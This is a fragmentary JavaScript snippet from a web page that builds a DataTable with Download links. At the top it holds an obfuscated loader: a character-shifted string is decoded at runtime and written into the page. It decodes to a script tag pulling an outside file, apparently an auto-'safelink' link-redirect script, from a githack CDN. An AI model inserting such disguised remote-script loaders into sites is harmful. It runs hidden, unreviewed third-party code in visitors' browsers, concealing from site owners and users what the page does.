...
var sautoKLINKZ = "=tdsjqu!tsd>#iuuqt;00sbxdeo/hjuibdl/dpn0lbsffmlvo0tfswfslmjol{0b468edf7edbb614e216:c974:8b63b647ecff1890BVUPtbgfmjol/kt#?=0tdsjqu?";
mautoKLINKZ = "";
for (i = 0; i < sautoKLINKZ.length; i++) {
    if (sautoKLINKZ.charCodeAt(i) == 28) {
        mautoKLINKZ += '&';
    } else if (sautoKLINKZ.charCodeAt(i) == 23) {
        mautoKLINKZ += '!';
    } else {
        mautoKLINKZ += String.fromCharCode(sautoKLINKZ.charCodeAt(i) - 1);
    }
}
document.write(mautoKLINKZ);
...
function writeTableWith(dataSource){
    ...
    var oTable = jqueryNoConflict("#data-table-container").dataTable({
        ...
        "fnRowCallback": function(nRow, aData, iDisplayIndex) {
            console.log(aData);
            $("td:eq(2)", nRow).html("<a href='" + aData.download + "'><b>Download</b></a>");
            return nRow;
        },
        "oLanguage": {
